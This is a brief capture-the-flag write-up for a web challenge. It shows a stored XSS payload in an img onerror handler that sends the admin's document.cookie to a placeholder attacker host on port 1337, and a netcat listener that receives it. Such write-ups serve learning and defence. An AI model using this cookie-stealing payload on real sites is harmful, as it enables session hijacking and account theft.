<h2>Solution</h2>

<p>The title reminds the XSS vulnerability.</p>

<p>The <code>https://xmas.2020.chall.actf.co/post</code> page can be used to post a message with an XSS attack. For example using an <code>img</code> tag like the following.</p>

<p><code>html
&lt;img src="foo.png" onerror="document.location='http://x.x.x.x:1337?c='+document.cookie;" /&gt;
</code></p>

<p>The website will return a code that can be used to identify the posted message.</p>

<p>The resulting code can be sent to administrator via <code>https://xmas.2020.chall.actf.co/report</code> page.</p>

<p>On a server listening with <code>nc</code>, you will receive the admin cookies.</p>

<p><code>
ubuntu@server:~$ nc -lvp 1337

Host: x.x.x.x:1337
Connection: keep-alive

</code></p>
